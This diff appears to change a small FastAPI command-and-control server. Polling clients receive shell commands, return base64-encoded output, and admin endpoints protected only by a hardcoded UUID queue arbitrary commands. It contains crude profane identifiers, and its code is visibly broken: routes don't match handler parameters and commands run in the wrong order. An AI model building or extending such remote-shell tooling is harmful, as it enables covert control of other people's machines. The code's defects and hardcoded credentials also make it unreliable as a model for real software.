@@ -16,10 +16,14 @@ valid_uuids = ['test-system',
                'ligma',
                'tctcl']
 
-# Commands are executed in reverse order -
-command_list = ['dir',
-                'cd ..',
-                'dir']
+admin_uuids = ['cockandballs']
+
+# Commands are executed in reverse order - fix this.
+command_response_list = ['dir',
+                         'cd ..',
+                         'dir']
+
+response_list = ['']
 
 app = FastAPI()
 
@@ -36,24 +40,43 @@ def ping(uuid: str):
 
 @app.get('/commands/<{uuid}>')
 def command(uuid: str):
-    if len(command_list) > 0:
-        return Response(command_list[len(command_list) - 1])
+    if len(command_response_list) > 0:
+        return Response(command_response_list[len(command_response_list) - 1])
     else:
         return Response('')
 
 
 @app.get('/command_response/<{uuid}>{response}')
 def command_response(response: str):
-    if len(command_list) > 0:
-        command_list.remove(command_list[len(command_list) - 1])
-        decoded_response = response.encode('ascii')
-        decoded_response = base64.b64decode(decoded_response)
-        decoded_response = decoded_response.decode('ascii')
-        print(decoded_response)
+    response = decode(response)
+    command_response_list.insert(0, response)
+    print(command_response_list[0])
     return Response('')
 
 
+# Admin endpoints start here
+# (these are scary, don't allow access to these without an admin UUID)
 
+@app.get('/admin/send_command/<{uuid}>{response}')
+def admin_send_command(admin_uuid: str, requested_command: str):
+    if admin_uuid in admin_uuids:
+        requested_command = encode(requested_command)
+        command_response_list.insert(0, requested_command)
+        return Response('')
+    else:
+        return Response('Admin UUID Required')
+
+
+@app.get('/admin/view_command_output/<{uuid}>{response}')
+def admin_view_command_output(admin_uuid: str, response: str):
+    if admin_uuid in admin_uuids:
+        command_output = encode(command_response_list[0])
+        return Response(command_output)
+    else:
+        return Response('Admin UUID Required')
+
+
+# Logging middleware
 @app.middleware("http")
 async def log_request(request: Request, call_next):
     ip = str(request.client.host)
@@ -70,3 +93,19 @@ async def log_request(request: Request, call_next):
         return response
     else:
         return Response('UUID invalid', status_code=401)
+
+
+# Misc functions start here
+
+def decode(string):
+    string = string.encode('ascii')
+    string = base64.b64decode(string)
+    string = string.decode('ascii')
+    return string
+
+
+def encode(string):
+    string = string.encode('ascii')
+    string = base64.b64encode(string)
+    string = string.decode('ascii')
+    return string
